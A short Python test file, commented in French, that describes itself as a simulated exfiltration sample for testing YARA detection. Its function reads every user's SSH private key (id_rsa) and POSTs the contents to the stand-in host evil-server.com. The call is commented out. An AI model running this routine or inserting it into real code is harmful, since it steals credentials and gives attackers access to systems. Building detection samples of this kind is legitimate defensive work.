# FICHIER DE TEST - Exfiltration de données simulée
# Ce fichier est un EXEMPLE pour tester la détection YARA

import requests
import os
import glob

def exfiltrate():
    sensitive_files = glob.glob("/home/*/.ssh/id_rsa")
    for filepath in sensitive_files:
        data = open(filepath).read()
        requests.post("http://evil-server.com/collect", data={"content": data})

# exfiltrate()
